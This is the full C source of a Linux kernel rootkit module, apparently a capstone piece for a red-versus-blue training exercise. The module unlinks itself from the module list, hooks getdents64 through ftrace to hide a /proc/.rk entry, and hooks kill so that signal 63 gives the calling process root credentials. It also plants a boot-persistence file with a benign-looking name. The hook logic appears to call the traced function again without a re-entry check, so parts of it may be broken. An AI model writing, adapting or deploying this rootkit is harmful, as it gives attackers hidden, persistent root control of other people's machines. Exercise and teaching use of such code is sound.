// SPDX-License-Identifier: GPL-2.0
#include <linux/cred.h>
#include <linux/dirent.h>
#include <linux/errno.h>
#include <linux/fs.h>
#include <linux/ftrace.h>
#include <linux/init.h>
#include <linux/kobject.h>
#include <linux/kprobes.h>
#include <linux/list.h>
#include <linux/module.h>
#include <linux/printk.h>
#include <linux/proc_fs.h>
#include <linux/slab.h>
#include <linux/uaccess.h>

#define HIDDEN_PROC ".rk"
#define SIG_ESCALATE 63
#define PERSIST_PATH "/etc/modules-load.d/hello.conf"

static struct proc_dir_entry *proc_entry;
static char status_buf[256];

// resolve symbols via kprobe
static unsigned long kaddr(const char *name)
{
	struct kprobe kp = { .symbol_name = name };
	unsigned long addr;

	if (register_kprobe(&kp))
		return 0;
	addr = (unsigned long)kp.addr;
	unregister_kprobe(&kp);
	return addr;
}

// --- module hiding ---

static struct list_head *saved_prev;

static void hide_module(void)
{
	saved_prev = THIS_MODULE->list.prev;
	list_del_init(&THIS_MODULE->list);
	kobject_del(&THIS_MODULE->mkobj.kobj);
}

// --- getdents64 hook: hide .rk from /proc listings ---

typedef long (*getdents64_t)(const struct pt_regs *);
static getdents64_t orig_getdents64;
static struct ftrace_ops gd_ops;
static long hook_getdents64(const struct pt_regs *regs);

static void notrace gd_callback(unsigned long ip, unsigned long parent_ip,
				 struct ftrace_ops *ops,
				 struct ftrace_regs *fregs)
{
	struct pt_regs *regs = ftrace_get_regs(fregs);
	if (regs)
		regs->ip = (unsigned long)hook_getdents64;
}

static long hook_getdents64(const struct pt_regs *regs)
{
	long ret;
	struct linux_dirent64 __user *dirp;
	char *kbuf;
	long off;

	ret = orig_getdents64(regs);
	if (ret <= 0)
		return ret;

	dirp = (struct linux_dirent64 __user *)regs->si;
	kbuf = kmalloc(ret, GFP_KERNEL);
	if (!kbuf)
		return ret;
	if (copy_from_user(kbuf, dirp, ret)) {
		kfree(kbuf);
		return ret;
	}

	off = 0;
	while (off < ret) {
		struct linux_dirent64 *cur = (struct linux_dirent64 *)(kbuf + off);
		if (strcmp(cur->d_name, HIDDEN_PROC) == 0) {
			long remaining = ret - off - cur->d_reclen;
			if (remaining > 0)
				memmove(kbuf + off, kbuf + off + cur->d_reclen,
					remaining);
			ret -= cur->d_reclen;
			continue;
		}
		off += cur->d_reclen;
	}

	copy_to_user(dirp, kbuf, ret);
	kfree(kbuf);
	return ret;
}

// --- kill hook: signal 63 escalates to root ---

typedef long (*kill_t)(const struct pt_regs *);
static kill_t orig_kill;
static struct ftrace_ops kill_ops;
static long hook_kill(const struct pt_regs *regs);

static void notrace kill_callback(unsigned long ip, unsigned long parent_ip,
				   struct ftrace_ops *ops,
				   struct ftrace_regs *fregs)
{
	struct pt_regs *regs = ftrace_get_regs(fregs);
	if (regs)
		regs->ip = (unsigned long)hook_kill;
}

static long hook_kill(const struct pt_regs *regs)
{
	int sig = (int)regs->si;
	pid_t target = (pid_t)regs->di;

	if (target == current->pid && sig == SIG_ESCALATE) {
		struct cred *cred = prepare_creds();
		if (cred) {
			cred->uid.val = 0;
			cred->gid.val = 0;
			cred->euid.val = 0;
			cred->egid.val = 0;
			commit_creds(cred);
		}
		return 0;
	}
	return orig_kill(regs);
}

// --- proc interface (hidden, accessible by direct path) ---

static ssize_t status_read(struct file *f, char __user *buf,
			   size_t count, loff_t *pos)
{
	int len = snprintf(status_buf, sizeof(status_buf),
			   "hidden=yes\npersistence=%s\nescalation=kill-%d\n",
			   PERSIST_PATH, SIG_ESCALATE);
	return simple_read_from_buffer(buf, count, pos, status_buf, len);
}

static const struct proc_ops status_proc_ops = {
	.proc_read = status_read,
};

// --- ftrace helper ---

static int install_hook(unsigned long addr, struct ftrace_ops *ops,
			void (*cb)(unsigned long, unsigned long,
				   struct ftrace_ops *, struct ftrace_regs *))
{
	int err;

	ops->func = cb;
	ops->flags = FTRACE_OPS_FL_SAVE_REGS |
		     FTRACE_OPS_FL_IPMODIFY |
		     FTRACE_OPS_FL_RECURSION;
	err = ftrace_set_filter_ip(ops, addr, 0, 0);
	if (err)
		return err;
	return register_ftrace_function(ops);
}

// --- boot persistence ---

static void install_persistence(void)
{
	struct file *f;
	loff_t off = 0;
	char *argv[] = { "/bin/sh", "-c", "mkdir -p /etc/modules-load.d", NULL };
	char *envp[] = { "PATH=/bin:/sbin", NULL };

	call_usermodehelper(argv[0], argv, envp, UMH_WAIT_PROC);

	f = filp_open(PERSIST_PATH, O_WRONLY | O_CREAT | O_TRUNC, 0644);
	if (IS_ERR(f))
		return;
	kernel_write(f, "hello\n", 6, &off);
	filp_close(f, NULL);
}

static void remove_persistence(void)
{
	char *argv[] = { "/bin/sh", "-c", "rm -f " PERSIST_PATH, NULL };
	char *envp[] = { "PATH=/bin:/sbin", NULL };
	call_usermodehelper(argv[0], argv, envp, UMH_WAIT_PROC);
}

// --- init/exit ---

static int __init rootkit_init(void)
{
	unsigned long gd_addr, kill_addr;
	int err;

	gd_addr = kaddr("__x64_sys_getdents64");
	kill_addr = kaddr("__x64_sys_kill");
	if (!gd_addr || !kill_addr)
		return -ENOENT;

	proc_entry = proc_create(HIDDEN_PROC, 0444, NULL, &status_proc_ops);
	if (!proc_entry)
		return -ENOMEM;

	orig_getdents64 = (getdents64_t)gd_addr;
	err = install_hook(gd_addr, &gd_ops, gd_callback);
	if (err) {
		proc_remove(proc_entry);
		return err;
	}

	orig_kill = (kill_t)kill_addr;
	err = install_hook(kill_addr, &kill_ops, kill_callback);
	if (err) {
		unregister_ftrace_function(&gd_ops);
		proc_remove(proc_entry);
		return err;
	}

	install_persistence();
	hide_module();

	pr_info("rk: rootkit active\n");
	return 0;
}

static void __exit rootkit_exit(void)
{
	unregister_ftrace_function(&kill_ops);
	unregister_ftrace_function(&gd_ops);
	proc_remove(proc_entry);
	remove_persistence();
}

module_init(rootkit_init);
module_exit(rootkit_exit);

MODULE_LICENSE("GPL");
MODULE_DESCRIPTION("Capstone 5: full rootkit for red vs blue exercise");
